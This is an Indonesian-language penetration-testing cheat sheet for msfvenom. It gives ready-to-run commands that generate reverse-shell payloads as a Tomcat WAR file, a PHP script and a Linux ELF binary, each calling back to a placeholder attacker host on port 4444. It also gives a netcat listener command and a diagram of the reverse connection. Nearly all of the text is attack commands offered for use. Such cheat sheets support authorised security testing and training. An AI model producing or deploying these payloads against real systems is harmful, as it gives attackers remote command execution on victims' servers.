# msfvenom (Payload Generator)

`msfvenom` digunakan untuk membuat payload dalam berbagai format dan platform.

> **LHOST = IP mesin pentester/penyerang yang menjalankan listener.**  
> **LPORT = Port listener yang digunakan untuk menerima koneksi reverse shell.**

## WAR (Apache Tomcat)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o shell.war

# LHOST → IP mesin pentester/penyerang
# LPORT → Port listener pada mesin pentester
# -f war → Format output WAR
# -o → Nama file output
```

**Keterangan:**  
Menghasilkan file `.war` untuk lingkungan Java/Tomcat. Setelah payload dijalankan
pada target, koneksi reverse shell diarahkan ke `LHOST:LPORT`.

---

## PHP

```bash
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.php

# LHOST → IP mesin pentester/penyerang
# LPORT → Port listener pada mesin pentester
# -f raw → Format output raw
# -o → Nama file output
```

**Keterangan:**  
Menghasilkan payload PHP yang melakukan koneksi kembali ke mesin pentester.

---

## ELF (Linux Binary)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell.elf

# LHOST → IP mesin pentester/penyerang
# LPORT → Port listener pada mesin pentester
# -f elf → Format executable Linux ELF
# -o → Nama file output
```

**Keterangan:**  
Menghasilkan executable ELF untuk Linux 64-bit yang akan melakukan koneksi
kembali ke `LHOST:LPORT`.

---

## Listener

Sebelum payload dijalankan pada target, jalankan listener pada mesin pentester:

```bash
nc -lvnp 4444

# -l → Listen mode
# -v → Verbose
# -n → Tanpa DNS resolution
# -p → Port listener
```

---

## Alur Reverse Shell

```text
┌──────────────────────┐
│ Pentester / Attacker │
│ IP: <ATTACKER_IP>    │
│ Listener: 4444       │
└──────────▲───────────┘
           │
           │ Reverse Connection
           │
┌──────────┴───────────┐
│ Target                │
│ Menjalankan Payload   │
└───────────────────────┘
```

```text
LHOST = IP Pentester / Attacker
LPORT = Port Listener
Target = Mesin yang menjalankan Payload
```

> **Catatan:** `LHOST` bukan IP target. Pada reverse shell, target melakukan
> koneksi **kembali menuju LHOST:LPORT** milik mesin pentester.
